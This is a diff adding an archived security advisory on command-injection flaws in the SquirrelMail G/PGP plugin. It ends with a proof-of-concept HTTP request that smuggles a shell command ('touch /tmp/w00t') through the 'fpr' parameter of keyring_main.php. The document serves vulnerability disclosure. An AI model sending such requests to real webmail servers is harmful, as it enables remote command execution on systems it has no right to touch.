@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/24828/info
+
+Vulnerabilities in the SquirrelMail G/PGP encryption plugin may allow malicious webmail users to execute system commands remotely. These issues occur because the application fails to sufficiently sanitize user-supplied data.
+
+Commands would run in the context of the webserver hosting the vulnerable software.
+
+Reports indicate that these vulnerabilities reside in SquirrelMail G/PGP 2.0 and 2.1 and that the vendor is aware of the issues. This has not been confirmed.
+
+No further technical details are currently available. We will update this BID as more information emerges. 
+
+$ nc *** 80
+POST /webmail/plugins/gpg/modules/keyring_main.php HTTP/1.1
+Host: ***
+User-Agent: w00t
+Keep-Alive: 300
+Connection: keep-alive
+Cookie: Authentication Data for SquirrelMail
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 140
+
+id=C5B1611B8E71C***&fpr= | touch /tmp/w00t | &pos=0&sort=email_name&desc=&srch=&ring=all&passphrase=&deletekey=true&deletepair=false&trust=1 
